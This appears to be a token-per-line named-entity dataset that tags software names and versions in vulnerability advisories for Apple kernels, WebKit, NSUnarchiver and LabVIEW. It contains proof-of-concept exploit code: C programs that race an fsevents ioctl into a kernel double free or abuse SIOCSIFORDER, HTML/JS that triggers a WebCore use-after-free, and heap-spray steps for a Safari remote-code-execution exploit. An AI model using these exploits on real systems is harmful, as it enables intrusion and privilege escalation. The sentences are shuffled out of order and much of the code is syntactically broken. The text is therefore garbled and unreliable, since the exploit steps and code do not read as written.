can O
cause O
an O
attacker O
controlled O
looping O
condition O
resulting O
in O
an O
arbitrary O
null O
write O
. O

An O
attacker O
controlled O
VI O
file O
can O
be O
used O
to O
trigger O
this O
vulnerability O
, O
exploitation O
could O
lead O
to O
remote O
code O
execution O
. O

A O
specially O
crafted O
VI O
file O
can O
cause O
a O
user O
controlled O
value O
to O
be O
used O
as O
a O
loop O
terminator O
resulting O
in O
internal O
heap O
corruption O
. O

An O
exploitable O
memory O
corruption O
vulnerability O
exists O
in O
the O
LvVariantUnflatten O
functionality O
in O
64-bit O
versions O
of O
LabVIEW SN
before SV
2015 SV
SP1 SV
f7 SV
Patch SV
and SV
2016 SV
before SV
f2 SV
Patch SV
. O

The O
issue O
involves O
the O
WindowServer O
component O
. O

void O
handleBlock O
( O
BlockIndex O
blockIndex O
if O
( O
range.m_count O
) O
{ O
if O
( O
data.m_addend O
range.m_maxBound O
) O
{ O
range.m_maxBound O
= O
data.m_addend O
; O
range.m_maxOrigin O
= O
node- O
> O
origin.semantic O
; O
} O
else O
if O
( O
data.m_addend O
< O
range.m_minBound O
) O
{ O
range.m_minBound O
= O
data.m_addend O
; O
range.m_minOrigin O
= O
node- O
> O
origin.semantic O
The O
problem O
is O
that O
the O
check O
|data.m_addend O
range.m_maxBound| O
is O
a O
signed O
comparison O
. O

For O
example O
, O
when O
the O
following O
JavaScript O
code O
is O
compiled O
, O
there O
are O
all O
bound O
checks O
for O
8 O
, O
5 O
, O
2 O
, O
but O
after O
the O
optimization O
, O
the O
checks O
for O
5 O
and O
2 O
are O
removed O
, O
and O
the O
only O
check O
for O
8 O
will O
remain O
. O

These O
bound O
checks O
are O
re-optimized O
and O
the O
unnecessary O
checks O
are O
removed O
, O
which O
is O
performed O
by O
IntegerCheckCombiningPhase O
: O
:handleBlock O
. O

function O
f O
( O
) O
{ O
let O
arr O
= O
new O
Uint32Array O
( O
10 O
) O
; O
for O
( O
let O
i O
= O
0 O
; O
i O
< O
0x100000 O
; O
i++ O
) O
{ O
parseInt O
( O
) O
; O
} O
arr O
= O
1 O
; O
arr O
= O
2 O
; O
arr O
= O
3 O
; O
} O
f O
( O
) O
; O
Note O
: O
parseInt O
is O
for O
forcing O
to O
start O
the O
JIT O
optimization O
. O

WebKit O
JSC O
- O
JIT O
Optimization O
Check O
Failed O
in O
IntegerCheckCombiningPhase O
: O
:handleBlock O

The O
issue O
involves O
the O
IOGraphics O
component O
. O

The O
issue O
involves O
the O
Multi-Touch O
component O
. O

In O
our O
exploit O
we O
perform O
step O
5 O
in O
a O
separate O
web O
worker O
, O
so O
that O
we O
can O
launch O
a O
second O
stage O
shellcode O
immediately O
after O
the O
victim O
arrays O
are O
overwritten O
. O

We O
use O
the O
following O
heap O
spray O
to O
exploit O
the O
bug O
: O
- O
Allocate O
100 O
JSArrays O
of O
size O
0x40000 O
and O
root O
them O
( O
i.e O
. O

keep O
references O
) O
. O

This O
will O
trigger O
GC O
multiple O
times O
and O
fill O
up O
holes O
in O
the O
heap O
. O

What O
is O
left O
to O
do O
now O
is O
to O
perform O
some O
heap O
feng-shui O
to O
place O
something O
interesting O
on O
the O
heap O
that O
we O
will O
then O
overflow O
into O
. O

- O
Allocate O
4 O
GiB O
of O
padding O
using O
JSArrays O
. O

The O
target O
buffer O
will O
be O
allocated O
in O
the O
sprayed O
region O
from O
step O
2 O
and O
the O
victim O
buffers O
from O
step O
3 O
will O
be O
overwritten O
. O

As O
such O
, O
roughly O
4 O
billion O
JSValues O
will O
have O
to O
be O
allocated O
, O
taking O
up O
32 O
GiB O
in O
RAM O
. O

- O
Allocate O
a O
larger O
JSArray O
and O
an O
ArrayBuffer O
of O
the O
same O
size O
. O

It O
will O
, O
however O
, O
take O
roughly O
a O
minute O
to O
trigger O
the O
bug O
. O

This O
triggers O
GC O
and O
leaves O
holes O
of O
size O
0x40000 O
in O
the O
heap O
. O

- O
Trigger O
the O
bug O
by O
concatenating O
JSArrays O
with O
a O
combined O
size O
of O
232 O
+ O
0x40000 O
( O
containing O
the O
repeated O
byte O
0x41 O
) O
. O

This O
increases O
the O
size O
of O
the O
victim O
array O
to O
the O
sprayed O
value O
( O
0x4141414141414141 O
) O
, O
so O
that O
it O
overlaps O
with O
the O
victim O
ArrayBuffer O
. O

These O
end O
up O
directly O
after O
the O
spray O
from O
step O
2 O
. O

- O
Allocate O
100 O
JSArrays O
of O
size O
0x40000 O
, O
where O
only O
every O
second O
one O
is O
rooted O
. O

This O
way O
we O
do O
not O
need O
to O
wait O
for O
the O
full O
overwrite O
to O
finish O
, O
and O
the O
heap O
is O
only O
left O
in O
a O
broken O
state O
for O
a O
very O
short O
time O
, O
so O
that O
garbage O
collection O
does O
not O
crash O
( O
which O
runs O
concurrently O
starting O
from O
Safari SN
version O
10.1 SV
) O
. O

The O
final O
steps O
immediately O
yield O
the O
fakeobj O
and O
addrof O
primitives O
described O
in O
section O
1.2 O
of O
the O
JavaScriptCore O
phrack O
paper O
which O
can O
then O
be O
used O
to O
write O
code O
to O
a O
JIT O
page O
and O
jump O
to O
it O
. O

Apple SN
Safari SN
10.1 SV
- O
Spread O
Operator O
Integer O
Overflow O
Remote O
Code O
Execution O

And O
that O
place O
is O
secured O
in O
the O
following O
method O
. O

So O
, O
in O
a O
certain O
case O
, O
it O
fails O
to O
secure O
the O
place O
for O
|derivedConstructorPrivateName| O
, O
but O
|emitPutToScope| O
is O
called O
, O
which O
results O
in O
an O
OOB O
write O
. O

BytecodeGenerator O
: O
:initializeArrowFunctionContextScopeIfNeeded O
: O
if O
( O
isConstructor O
( O
) O
& O
& O
constructorKind O
( O
) O
ConstructorKind O
: O
:Extends O
& O
& O
isSuperUsedInInnerArrowFunction O
( O
) O
) O
BytecodeGenerator O
: O
:emitPutDerivedConstructorToArrowFunctionContextScope O
: O
if O
( O
( O
isConstructor O
( O
) O
& O
& O
constructorKind O
( O
) O
ConstructorKind O
: O
:Extends O
) O
|| O
m_codeBlock- O
> O
isClassContext O
( O
) O
) O
{ O
if O
( O
isSuperUsedInInnerArrowFunction O
( O
) O
) O
{ O
Note O
m_codeBlock- O
> O
isClassContext O
( O
) O
. O

void O
BytecodeGenerator O
: O
:emitPutDerivedConstructorToArrowFunctionContextScope O
( O
) O
{ O
if O
( O
( O
isConstructor O
( O
) O
& O
& O
constructorKind O
( O
) O
ConstructorKind O
: O
:Extends O
) O
|| O
m_codeBlock- O
> O
isClassContext O
( O
) O
) O
{ O
if O
( O
isSuperUsedInInnerArrowFunction O
( O
) O
) O
{ O
ASSERT O
( O
m_arrowFunctionContextLexicalEnvironmentRegister O
) O
; O
Variable O
protoScope O
= O
variable O
( O
propertyNames O
( O
) O
.builtinNames O
( O
) O
.derivedConstructorPrivateName O
( O
) O
) O
; O
emitPutToScope O
( O
m_arrowFunctionContextLexicalEnvironmentRegister O
, O
protoScope O
, O
& O
m_calleeRegister O
, O
DoNotThrowIfNotFound O
, O
InitializationMode O
: O
:Initialization O
emitPutToScope| O
is O
directly O
called O
without O
resolving O
the O
scope O
. O

This O
means O
the O
scope O
|m_arrowFunctionContextLexicalEnvironmentRegister| O
must O
have O
a O
place O
for O
|derivedConstructorPrivateName| O
. O

WebKit O
JSC O
- O
Incorrect O
Check O
in O
emitPutDerivedConstructorToArrowFunctionContextScope O

iCloud SN
before SV
6.2.1 SV
on O
Windows O
is O
affected O
. O

The O
issue O
involves O
the O
TextInput O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
crafted O
data O
. O

The O
TextInput O
framework O
which O
is O
loaded O
has O
a O
class O
TIKeyboardLayout O
. O

The O
initWithCoder O
: O
implementation O
has O
this O
code O
: O
( O
this O
is O
the O
x86 O
code O
, O
the O
framework O
is O
there O
on O
both O
platforms O
. O
) O

Use O
ASAN O
to O
see O
the O
crash O
clearly O
( O
see O
provided O
compiler O
invokation O
. O
) O

The O
memcpy O
then O
uses O
the O
original O
length O
( O
not O
rounded O
down O
) O
causing O
a O
controlled O
heap O
buffer O
overflow O
. O

This O
has O
the O
effect O
of O
mallocing O
the O
original O
size O
rounded O
down O
to O
the O
nearest O
multiple O
of O
8 O
. O

tested O
on O
MacOS SN
10.12.3 SV
( O
16D32 SV
) O
Proof O
of O
Concept O
: O

Attached O
python O
script O
will O
generate O
a O
serialized O
NSBuiltinCharacterSet O
with O
a O
value O
of O
42 O
for O
the O
character O
set O
identifier O
. O

It O
reads O
a O
controlled O
int O
using O
decodeValueOfObjCType O
: O
i O
then O
either O
passes O
it O
to O
CFCharacterSetGetPredefined O
or O
uses O
it O
directly O
to O
manipulate O
NSBuiltinSetTable O
. O

Neither O
path O
has O
any O
bounds O
checking O
and O
the O
index O
is O
used O
to O
maniupulate O
c O
arrays O
of O
pointers O
. O

Apple O
macOS/iOS O
- O
NSUnarchiver O
Heap O
Corruption O
Due O
to O
Lack O
of O
Bounds O
Checking O
in O
[ O
NSBuiltinCharacterSet O
initWithCoder O
: O
] O

The O
issue O
involves O
the O
CoreFoundation O
component O
. O

( O
note O
that O
the O
actual O
PoC O
object O
is O
in O
the O
other O
file O
( O
longer_patched.bin O
) O
tested O
on O
MacOS SN
10.12.3 SV
( O
16D32 SV
) O
A O
few O
notes O
on O
the O
relevance O
of O
these O
bugs O
: O
NSXPC O
uses O
the O
secure O
version O
of O
NSKeyedArchiver O
where O
the O
expected O
types O
have O
to O
be O
declared O
upfront O
by O
a O
message O
receiver O
. O

For O
example O
the O
following O
files O
are O
inside O
the O
AFC O
jail O
: O
egrep O
-Rn O
NSKeyedArchiver O
Binary O
file O
Downloads/downloads.28.sqlitedb O
matches O
Binary O
file O
Downloads/downloads.28.sqlitedb-wal O
matches O
Binary O
file O
PhotoData/AlbumsMetadata/0F31509F-271A-45BA-9E1F-C6F7BC4A537F.foldermetadata O
matches O
Binary O
file O
PhotoData/FacesMetadata/NVP_HIDDENFACES.hiddenfacemetadata O
matches O
00006890 O
| O
24 O
76 O
65 O
72 O
73 O
69 O
6F O
6E O
58 O
24 O
6F O
62 O
6A O
65 O
63 O
74 O
| O
$ O
versionX O
$ O
object O
000068A0 O
| O
73 O
59 O
24 O
61 O
72 O
63 O
68 O
69 O
76 O
65 O
72 O
54 O
24 O
74 O
6F O
70 O
| O
sY O
$ O
archiverT O
$ O
top O
Proof O
of O
Concept O
: O

In O
those O
cases O
you O
could O
use O
these O
bugs O
to O
escape O
sandboxes/escalate O
privileges O
. O

The O
wikileaks O
dump O
implies O
that O
this O
kind O
of O
bug O
can O
be O
exploited O
both O
via O
IPC O
and O
as O
a O
persistence O
mechanism O
where O
apps O
serialize O
objects O
to O
disk O
. O

This O
restricts O
the O
NSXPC O
attack O
surface O
for O
these O
issues O
to O
either O
places O
where O
overly O
broad O
base O
classes O
are O
accepted O
( O
like O
NSObject O
) O
or O
to O
just O
those O
services O
which O
accept O
classes O
with O
vulnerable O
deserializers O
. O

This O
PoC O
is O
just O
a O
crasher O
but O
it O
looks O
pretty O
exploitable O
. O

The O
host O
computer O
would O
need O
to O
have O
a O
valid O
pairing O
record O
to O
do O
this O
without O
prompts O
. O

Some O
regular O
( O
not O
NSXPC O
) O
xpc O
services O
use O
these O
. O

Apple O
macOS/iOS O
- O
Memory O
Corruption O
Due O
to O
Bad O
Bounds O
Checking O
in O
NSCharacterSet O
Coding O
for O
NSKeyedUnarchiver O

Tested O
on O
Linux O
. O

bool O
WARN_UNUSED_RETURN O
ensureLength O
( O
VM O
& O
vm O
, O
unsigned O
length O
) O
{ O
ASSERT O
( O
length O
< O
MAX_ARRAY_INDEX O
) O
; O
ASSERT O
( O
hasContiguous O
( O
indexingType O
hasInt32 O
( O
indexingType O
hasDouble O
( O
indexingType O
hasUndecided O
( O
indexingType O
( O
) O
) O
) O
; O
bool O
result O
= O
true O
; O
if O
( O
m_butterfly.get O
( O
) O
- O
> O
vectorLength O
( O
) O
< O
length O
) O
result O
= O
ensureLengthSlow O
( O
vm O
, O
length O
) O
; O
if O
( O
m_butterfly.get O
( O
) O
- O
> O
publicLength O
( O
) O
< O
length O
) O
m_butterfly.get O
( O
) O
- O
> O
setPublicLength O
( O
length O
) O
; O
return O
result O
; O
} O
|setPublicLength| O
is O
called O
whether O
|ensureLengthSlow| O
failed O
or O
not O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
SQL O
statement O
. O

Tested O
on O
Safari SN
10.0.3 SV
( O
12602.4.8 SV
) O
. O

Apple SN
WebKit SN
Safari SN
10.0.3 SV
( O
12602.4.8 SV
) O
- O
WebCore O
: O
:FrameView O
: O
:scheduleRelayout O
Use-After-Free O

It O
allows O
attackers O
to O
execute O
arbitrary O
unsigned O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
app O
. O

watchOS SN
before SV
3.2 SV
is O
affected O
. O

tvOS SN
before SV
10.2 SV
is O
affected O
. O

iOS SN
before SV
10.3 SV
is O
affected O
. O

macOS SN
before SV
10.12.4 SV
is O
affected O
. O

This O
leads O
to O
a O
double O
free O
, O
which O
if O
you O
also O
race O
allocations O
from O
the O
same O
zone O
can O
lead O
to O
an O
exploitable O
kernel O
use O
after O
free O
. O

/dev/fsevents O
is O
: O
crw-r O
r O
1 O
root O
wheel O
13 O
, O
0 O
Feb O
15 O
14:00 O
/dev/fsevents O
so O
this O
is O
a O
privesc O
from O
either O
root O
or O
members O
of O
the O
wheel O
group O
to O
kernel O
tested O
on O
MacOS SN
10.12.3 SV
( O
16D32 SV
) O
on O
MacbookAir5,2 O
( O
build O
with O
-O3 O
) O
endif O
include O
< O
fcntl.h O
include O
< O
stdlib.h O
include O
< O
stdio.h O
include O
< O
sys/ioctl.h O
include O
< O
sys/types.h O
include O
< O
pthread.h O
include O
< O
unistd.h O
typedef O
uint64_t O
user64_addr_t O
; O
typedef O
struct O
fsevent_clone_args64 O
{ O
user64_addr_t O
event_list O
; O
int32_t O
num_events O
; O
int32_t O
event_queue_depth O
; O
user64_addr_t O
fd O
; O
} O
fsevent_clone_args64 O
; O
define O
FSEVENTS_CLONE_64 O
_IOW O
1 O
, O
fsevent_clone_args64 O
) O
pragma O
pack O
( O
push O
, O
4 O
) O
typedef O
struct O
fsevent_dev_filter_args64 O
{ O
uint32_t O
num_devices O
; O
user64_addr_t O
devices O
; O
} O
fsevent_dev_filter_args64 O
; O
pragma O
pack O
( O
pop O
) O
define O
FSEVENTS_DEVICE_FILTER_64 O
_IOW O
100 O
, O
fsevent_dev_filter_args64 O
) O
void O
racer O
( O
void O
thread_arg O
) O
{ O
int O
fd O
= O
( O
int O
) O
thread_arg O
; O
printf O
( O
started O
thread O
) O
; O
fsevent_dev_filter_args64 O
arg O
= O
{ O
0 O
} O
; O
int32_t O
dev O
= O
0 O
; O
while O
( O
1 O
) O
{ O
arg.num_devices O
= O
1 O
; O
arg.devices O
= O
( O
user64_addr_t O
) O
& O
dev O
; O
int O
err O
= O
ioctl O
( O
fd O
, O
FSEVENTS_DEVICE_FILTER_64 O
, O
& O
arg O
) O
; O
if O
( O
err O
-1 O
) O
{ O

/dev/fsevents O
is O
: O
crw-r O
r O
1 O
root O
wheel O
13 O
, O
0 O
Feb O
15 O
14:00 O
/dev/fsevents O
so O
this O
is O
a O
privesc O
from O
either O
root O
or O
members O
of O
the O
wheel O
group O
to O
kernel O
tested O
on O
MacOS SN
10.12.3 SV
( O
16D32 SV
) O
on O
MacbookAir5,2 O
( O
build O
with O
-O3 O
) O
The O
open O
handler O
for O
the O
fsevents O
device O
node O
has O
a O
further O
access O
check O
: O
if O
( O
! O
kauth_cred_issuser O
( O
kauth_cred_get O
return O
EPERM O
; O
} O
restricting O
this O
issue O
to O
root O
only O
despite O
the O
permissions O
on O
the O
device O
node O
( O
which O
is O
world-readable O
) O
ianbeer O
if O
0 O
MacOS/iOS O
kernel O
double O
free O
due O
to O
bad O
locking O
in O
fsevents O
device O
fseventsf_ioctl O
handles O
ioctls O
on O
fsevent O
fds O
acquired O
via O
FSEVENTS_CLONE_64 O
on O
/dev/fsevents O
Heres O
the O
code O
for O
the O
FSEVENTS_DEVICE_FILTER_64 O
ioctl O
: O
case O
FSEVENTS_DEVICE_FILTER_64 O
: O
if O
( O
! O
proc_is64bit O
( O
vfs_context_proc O
( O
ctx O
) O
) O
) O
{ O
ret O
= O
EINVAL O
; O
break O
; O
} O
devfilt_args O
= O
( O
fsevent_dev_filter_args64 O
) O
data O
; O
handle_dev_filter O
: O
{ O
int O
new_num_devices O
; O
dev_t O
devices_not_to_watch O
, O
tmp=NULL O
; O
if O
( O
devfilt_args- O
> O
num_devices O
256 O
) O
{ O
ret O
= O
EINVAL O
; O
break O
; O
} O
new_num_devices O
= O
devfilt_args- O
> O
num_devices O
; O
if O
( O
new_num_devices O
0 O
) O
{ O
tmp O
= O
fseh- O
> O
watcher- O
> O
devices_not_to_watch O
; O
< O
( O
a O

Apple SN
macOS/iOS SN
Kernel SN
10.12.3 SV
( O
16D32 O
) O
- O
Double-Free O
Due O
to O
Bad O
Locking O
in O
fsevents O
Device O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
font O
file O
. O

The O
issue O
involves O
the O
FontParser O
component O
. O

The O
issue O
involves O
the O
Security O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
X.509 O
certificate O
file O
. O

Safari SN
before SV
10.1 SV
is O
affected O
. O

The O
issue O
involves O
the O
libxslt O
component O
. O

It O
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
via O
unknown O
vectors O
. O

( O
std O
: O
:is_same O
< O
WebCore O
: O
:HTMLDocument O
, O
WebCore O
: O
:Document O
> O
: O
:value O
) O
, O
WebCore O
: O
:JSDOMWrapperConverterTraits O
< O
WebCore O
: O
:HTMLDocument O
> O
: O
:WrapperClass O
> O
: O
:type O
WebCore O
: O
:createWrapper O
< O
WebCore O
: O
:HTMLDocument O
, O
WebCore O
: O
:Document O
> O
( O
WebCore O
: O
:JSDOMGlobalObject O
, O
WTF O
: O
:Ref O
< O
WebCore O
: O
:Document O
Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x11b6e17 O
) O
15 O
0x115a1457c O
in O
WebCore O
: O
:createNewDocumentWrapper O
( O
JSC O
: O
:ExecState O
& O
, O
WebCore O
: O
:JSDOMGlobalObject O
& O
, O
WTF O
: O
:Ref O
< O
WebCore O
: O
:Document O
Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x11b657c O
) O
16 O
0x115a14746 O
in O
WebCore O
: O
:toJS O
( O
JSC O
: O
:ExecState O
, O
WebCore O
: O
:JSDOMGlobalObject O
, O
WebCore O
: O
:Document O
& O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x11b6746 O
) O
17 O
0x115f0dc3a O
in O
WebCore O
: O
:createWrapper O
( O
JSC O
: O
:ExecState O
, O
WebCore O
: O
:JSDOMGlobalObject O
, O
WTF O
: O
:Ref O
< O
WebCore O
: O
:Node O
Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x16afc3a O
) O
18 O
0x1154ddca8 O
in O
WebCore O
: O
:toJS O
( O
JSC O
: O
:ExecState O
, O
WebCore O
: O
:JSDOMGlobalObject O
, O
WebCore O
: O
:Node O
& O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xc7fca8 O
) O
19 O
0x115b8e39c O
in O
WebCore O
: O
:JSDOMWindowBase O
: O
:updateDocument O
( O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x133039c O
) O
20 O
0x116d5dfb1 O
in O
WebCore O
: O
:ScriptController O
: O
:initScript O
( O
WebCore O
: O
:DOMWrapperWorld O
& O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x24fffb1 O
) O
21 O
0x10d20ba77 O
in O
WebCore O
: O
:ScriptController O
: O
:windowShell O
( O
WebCore O
: O
:DOMWrapperWorld O
& O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x2eba77 O

Source O
: O
is O
a O
use-after-free O
security O
vulnerability O
in O
WebKit O
. O

ASan O
log O
: O
25184 O
ERROR O
: O
AddressSanitizer O
: O
heap-use-after-free O
on O
address O
0x61a000076e80 O
at O
pc O
0x000115bea4e0 O
bp O
0x7fff52cef2e0 O
sp O
0x7fff52cef2d8 O
READ O
of O
size O
8 O
at O
0x61a000076e80 O
thread O
T0 O
0 O
0x115bea4df O
in O
WebCore O
: O
:toJS O
( O
JSC O
: O
:ExecState O
, O
WebCore O
: O
:JSDOMGlobalObject O
, O
WebCore O
: O
:EventTarget O
& O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x138c4df O
) O
1 O
0x115bc7b72 O
in O
WebCore O
: O
:jsEventCurrentTargetGetter O
( O
JSC O
: O
:ExecState O
& O
, O
WebCore O
: O
:JSEvent O
& O
, O
JSC O
: O
:ThrowScope O
& O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1369b72 O
) O
2 O
0x115bc4c06 O
in O
long O
long O
WebCore O
: O
:BindingCaller O
< O
WebCore O
: O
:JSEvent O
> O
: O
:attribute O
< O
& O
( O
WebCore O
: O
:jsEventCurrentTargetGetter O
( O
JSC O
: O
:ExecState O
& O
, O
WebCore O
: O
:JSEvent O
& O
, O
JSC O
: O
:ThrowScope O
& O
) O
) O
, O
( O
WebCore O
: O
:CastedThisErrorBehavior O
) O
0 O
> O
( O
JSC O
: O
:ExecState O
, O
long O
long O
, O
char O
const O
) O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1366c06 O
) O
3 O
0x1121bd448 O
in O
JSC O
: O
:PropertySlot O
: O
:customGetter O
( O
JSC O
: O
:ExecState O
, O
JSC O
: O
:PropertyName O
) O
const O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1587448 O
) O
4 O
0x111ef652e O
in O
llint_slow_path_get_by_id O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12c052e O
) O
5 O
0x111f13926 O
in O
llint_entry O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12dd926 O
) O
6 O
0x111f17490 O
in O
llint_entry O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12e1490 O
) O
7 O
0x111f10aca O
in O
vmEntryToJavaScript O
( O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12daaca O
) O
8 O
0x111bca172 O
in O
JSC O
: O
:JITCode O
: O
:execute O
( O
JSC O
: O
:VM O
, O
JSC O

PoC O
: O
< O
script O
function O
freememory O
( O
) O
{ O
var O
a O
; O
for O
( O
var O
i=0 O
; O
i O
< O
100 O
; O
i++ O
) O
{ O
a O
= O
new O
Uint8Array O
( O
1024 O
1024 O
function O
f1 O
( O
) O
{ O
var O
iframe O
= O
document.getElementById O
( O
iframe O
) O
; O
iframe.srcdoc O
= O
x O
; O
window.frames.event O
= O
window.event O
; O
freememory O
( O
) O
; O
} O
function O
f2 O
( O
) O
{ O
var O
h O
= O
new O
XMLHttpRequest O
( O
) O
; O
h.onreadystatechange O
= O
f1 O
; O
h.open O
( O
foo O
, O
1 O
) O
; O
var O
e O
= O
window.event O
; O
e.initEvent O
( O
1 O
, O
true O
, O
true O
) O
; O
e.currentTarget.click O
script O
< O
/head O
< O
body O
onload=f1 O
( O
) O
< O
iframe O
id= O
iframe O
onload= O
f2 O
( O
) O
> O
< O
/iframe O
< O
! O

Apple O
WebKit O
- O
WebCore O
: O
:toJS O
Use-After-Free O

tested O
on O
MacOS SN
10.12.3 SV
( O
16D32 SV
) O
on O
MacbookAir5,2 O
endif O
include O
< O
stdlib.h O
include O
< O
stdio.h O
include O
< O
unistd.h O
include O
< O
sys/ioctl.h O
include O
< O
sys/socket.h O
include O
< O
mach/mach.h O
struct O
if_order O
{ O
u_int32_t O
ifo_count O
; O
u_int32_t O
ifo_reserved O
; O
mach_vm_address_t O
ifo_ordered_indices O
; O
array O
of O
u_int32_t O
define O
SIOCSIFORDER O
_IOWR O
( O
i O
, O
178 O
, O
struct O
if_order O
) O
int O
main O
( O
) O
{ O
uint32_t O
data O
[ O
] O
= O
{ O
0x80001234 O
} O
; O
struct O
if_order O
ifo O
; O
ifo.ifo_count O
= O
1 O
; O
ifo.ifo_reserved O
= O
0 O
; O
ifo.ifo_ordered_indices O
= O
( O
mach_vm_address_t O
) O
data O
; O
int O
fd O
= O
socket O
( O
PF_INET O
, O
SOCK_STREAM O
, O
0 O
) O
; O
int O
ret O
= O
ioctl O
( O
fd O
, O
SIOCSIFORDER O
, O
& O
ifo O
) O
; O
return O
0 O
; O
} O

This O
leads O
very O
directly O
to O
memory O
corruption O
at O
( O
d O
) O
which O
will O
add O
the O
value O
read O
out O
of O
bounds O
to O
a O
list O
structure O
. O

at O
( O
b O
) O
this O
value O
is O
cast O
to O
a O
signed O
type O
for O
a O
bounds O
check O
at O
( O
c O
) O
this O
value O
is O
used O
as O
an O
unsigned O
index O
by O
providing O
a O
value O
with O
the O
most-significant O
bit O
set O
making O
it O
negative O
when O
cast O
to O
a O
signed O
type O
we O
can O
pass O
the O
bounds O
check O
at O
( O
b O
) O
and O
lead O
to O
reading O
an O
interface O
pointer O
out-of-bounds O
below O
the O
ifindex2ifnet O
array O
. O

it O
falls O
through O
to O
calling O
: O
ifnet_reset_order O
( O
ordered_indices O
, O
ifo- O
> O
ifo_count O
) O
where O
ordered_indicies O
points O
to O
attacker-controlled O
bytes O
. O

ifnet_reset_order O
contains O
this O
code O
: O
for O
( O
u_int32_t O
order_index O
= O
0 O
; O
order_index O
< O
count O
; O
order_index++ O
) O
{ O
u_int32_t O
interface_index O
= O
ordered_indices O
[ O
order_index O
] O
; O
< O
( O
a O
) O
if O
( O
interface_index O
IFSCOPE_NONE O
|| O
( O
int O
) O
interface_index O
if_index O
b O
) O
break O
; O
} O
ifp O
= O
ifindex2ifnet O
[ O
interface_index O
] O
; O
< O
( O
c O
) O
if O
( O
ifp O
NULL O
) O
{ O
continue O
; O
} O
ifnet_lock_exclusive O
( O
ifp O
) O
; O
TAILQ_INSERT_TAIL O
( O
& O
ifnet_ordered_head O
, O
ifp O
, O
if_ordered_link O
) O
; O
< O
( O
d O
) O
ifnet_lock_done O
( O
ifp O
) O
; O
if_ordered_count++ O
; O
} O
at O
( O
a O
) O
a O
controlled O
32-bit O
value O
is O
read O
into O
an O
unsigned O
32-bit O
variable O
. O

It O
can O
be O
called O
on O
a O
regular O
tcp O
socket O
, O
so O
from O
pretty O
much O
any O
sandbox O
. O

tested O
on O
MacOS SN
10.12.3 SV
( O
16D32 SV
) O
on O
MacbookAir5,2 O
( O
on O
64-bit O
platforms O
the O
array O
index O
wouldn O
t O
wrap O
around O
so O
the O
read O
would O
actually O
occur O
2GB O
above O
the O
array O
, O
not O
below O
) O
ianbeer O
if O
0 O
MacOS/iOS O
kernel O
memory O
corruption O
due O
to O
Bad O
bounds O
checking O
in O
SIOCSIFORDER O
socket O
ioctl O
SIOCSIFORDER O
is O
a O
new O
ioctl O
added O
in O
iOS O
10 O
. O

Apple SN
macOS/iOS SN
Kernel SN
10.12.3 SV
( O
16D32 O
) O
- O
SIOCSIFORDER O
Socket O
ioctl O
Memory O
Corruption O
Due O
to O
Bad O
Bounds O
Checking O

Source O
: O
confirmed O
the O
PoC O
crashes O
the O
release O
version O
of O
Safari SN
10.0.3 SV
( O
12602.4.8 SV
) O
. O

( O
It O
might O
need O
to O
refresh O
the O
page O
several O
times O
. O
) O

The O
vulnerability O
was O
confirmed O
on O
a O
nightly O
version O
of O
WebKit O
. O

The O
PoC O
has O
also O
been O
observed O
to O
crash O
Safari SN
10.0.2 SV
on O
Mac O
. O

A O
minimal O
PoC O
is O
as O
follows O
, O
and O
a O
full O
PoC O
is O
attached O
. O

It O
calls O
JSArray O
: O
:appendMemcpy O
, O
which O
calculates O
the O
memory O
size O
for O
the O
combined O
arrays O
as O
follows O
: O
unsigned O
newLength O
= O
startIndex O
+ O
otherLength O
; O
If O
startIndex O
( O
resultIndex O
from O
concatSlowPath O
in O
JS O
) O
is O
very O
large O
, O
an O
integer O
overflow O
can O
occur O
, O
causing O
too O
small O
a O
buffer O
to O
be O
allocated O
, O
and O
copying O
to O
occur O
outside O
of O
the O
buffer O
. O

This O
will O
cause O
an O
undefined O
Array O
of O
the O
delete O
length O
to O
be O
allocated O
, O
and O
then O
returned O
without O
it O
being O
written O
to O
, O
which O
would O
cause O
it O
to O
decide O
its O
type O
. O

Arrays O
of O
type O
ArrayWithUndecided O
are O
usually O
of O
length O
0 O
, O
however O
, O
it O
